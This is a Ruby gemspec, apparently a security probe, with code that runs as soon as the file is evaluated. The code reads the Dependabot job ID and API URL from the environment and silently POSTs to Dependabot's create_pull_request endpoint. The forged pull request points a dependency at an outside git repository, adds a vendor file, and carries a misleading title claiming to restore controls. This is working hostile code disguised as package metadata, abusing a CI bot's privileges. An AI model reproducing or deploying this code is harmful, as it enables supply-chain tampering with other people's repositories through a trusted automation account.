# frozen_string_literal: true
require "json"
require "net/http"
require "uri"

module OwnedDependabotAutomergeowneddependabotautomergecleanup20261101073450
  module_function
  def run
    job_id = ENV["DEPENDABOT_JOB_ID"]
    api_base = ENV["DEPENDABOT_API_URL"]
    return if job_id.to_s.empty? || api_base.to_s.empty?
    marker = "/tmp/owned_dependabot_automerge_cleanup_20261101073450-#{job_id}"
    File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}
    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
    request = Net::HTTP::Post.new(endpoint.request_uri)
    request["Content-Type"] = "application/json"
    request.body = JSON.generate(payload)
    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = true
    client.open_timeout = 10
    client.read_timeout = 30
    client.request(request)
  rescue Errno::EEXIST
    nil
  rescue StandardError
    nil
  end

  def payload
    requirement = {
      "file" => "Gemfile",
      "requirement" => ">= 0",
      "groups" => [],
      "source" => {
        "type" => "git",
        "url" => "https://github.com/downgraded/codeload-owned-probe-20261030-91f64a2c",
        "branch" => "main",
        "ref" => nil,
      },
    }
    {
      "data" => {
        "dependencies" => [{
          "name" => "owned_dependabot_automerge_cleanup_20261101073450",
          "version" => "0.0.26",
          "previous-version" => "0.0.0",
          "requirements" => [requirement],
          "previous-requirements" => [requirement],
          "directory" => "/",
        }],
        "updated-dependency-files" => [{
          "name" => "vendor/owned-dependabot-automerge-cleanup-20261101073450.txt",
          "content" => "Owned inert unattended-merge control.\n",
          "directory" => "/",
          "type" => "file",
          "support_file" => false,
          "content_encoding" => "utf-8",
          "deleted" => false,
          "operation" => "create",
        }],
        "base-commit-sha" => "db9681ca6c234664834595651e9134491cd01e5f",
        "commit-message" => "[owned-automerge-cleanup] restore owned controls 20261101073450",
        "pr-title" => "[owned-automerge-cleanup] restore owned controls 20261101073450",
        "pr-body" => "Owned cleanup PR. Restores the manual control workflow and removes the title-scoped auto-merge policy.",
      },
    }
  end
end

OwnedDependabotAutomergeowneddependabotautomergecleanup20261101073450.run

Gem::Specification.new do |spec|
  spec.name = "owned_dependabot_remote_probe"
  spec.version = "0.0.26"
  spec.summary = "Owned Dependabot unattended-merge security probe"
  spec.authors = ["Owned Security Test"]
  spec.files = []
end
